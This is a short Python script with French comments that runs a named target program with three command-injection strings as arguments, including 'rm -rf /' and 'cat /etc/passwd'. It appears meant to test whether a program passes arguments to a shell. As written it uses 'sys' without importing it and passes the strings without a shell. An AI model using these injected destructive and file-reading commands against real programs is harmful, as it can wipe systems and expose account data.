import subprocess

# Récupérez le nom du programme cible à partir des arguments
target = sys.argv[1]

# Exécutez le programme cible en lui passant des arguments dangereux
dangerous_args = [
    "; rm -rf /",
    "| cat /etc/passwd",
    "&& echo 'hacked' > flag.txt"
]

# Exécutez le programme cible avec les différents arguments dangereux
for arg in dangerous_args:
    subprocess.call([target, arg])